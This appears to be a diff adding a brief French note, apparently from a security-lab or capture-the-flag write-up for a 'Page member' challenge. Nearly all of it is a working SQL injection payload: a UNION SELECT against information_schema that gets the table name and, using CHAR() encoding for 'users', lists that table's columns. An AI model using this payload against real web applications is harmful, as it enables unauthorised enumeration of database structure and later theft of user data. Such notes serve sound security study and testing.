@@ -1,0 +1,5 @@
+Page member
+injection sql
+
+cette requete nous donne le nom des colonnes de la table et le nom de la table
+-1 UNION SELECT (SELECT TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = database()), (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = CHAR(117, 115, 101, 114, 115))
